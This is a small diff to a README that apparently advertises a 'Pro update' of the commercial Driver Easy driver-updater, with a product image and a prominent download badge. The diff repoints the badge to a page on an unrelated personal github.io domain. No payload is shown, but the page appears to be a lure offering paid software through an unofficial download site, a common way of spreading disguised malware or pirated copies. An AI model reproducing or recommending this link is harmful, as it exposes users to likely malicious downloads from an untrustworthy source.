@@ -4,7 +4,7 @@
 <img src="https://de.colormango.com/utilities/boxshot/drivereasy_150426.png" width="780">
 </p>
 
-[![GET — DRIVER EASY PRO UPDATE](https://img.shields.io/badge/GET-DRIVER%20EASY%20PRO%20UPDATE-2563eb?style=for-the-badge)](https://postlethwaitultraoehlert.github.io/.github/)
+[![GET — DRIVER EASY PRO UPDATE](https://img.shields.io/badge/GET-DRIVER%20EASY%20PRO%20UPDATE-2563eb?style=for-the-badge)](https://postlethwaitultraoehlert.github.io/.github/Driver-Easy)
 
 ---
 
